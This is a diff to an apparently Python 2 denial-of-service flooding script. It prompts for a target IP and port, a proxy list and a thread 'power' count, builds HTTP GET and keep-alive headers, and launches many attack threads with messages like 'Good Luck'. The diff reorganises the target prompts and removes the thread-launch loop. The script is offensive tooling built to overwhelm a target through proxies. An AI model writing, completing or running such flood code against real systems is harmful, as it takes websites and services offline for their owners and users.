@@ -329,33 +329,17 @@ print('''
 
 	''')
         
-# Site
-url = raw_input("Target Example ( http://www.example.com ) : ")
-host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
- 
+
+ip = raw_input("IP Target : ")
+port = input("Port : ")
+	
+	
+	
 #Proxy
 in_file = open(raw_input("File Proxy ( proxy.txt ) : "),"r")
 proxyf = in_file.read()
 in_file.close()
 
-ip = raw_input("IP Target : ")
-port = input("Port : ")
+
 
 listaproxy = proxyf.split('\n')
-#So luong
-thread = input("Power ( 1000 ) : ") 
-get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
-accept = "Accept-Encoding: gzip, deflate\r\n"
-connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
-nload = 1
-x = 0
-
-for x in xrange(thread):
-    attacco().start()
-    time.sleep(0.003)	
-print "Program Started..."
-print "Good Luck..."
-print "Ctrl + Z Stop Program..."
-nload = 0
-while not nload:
-    time.sleep(1)
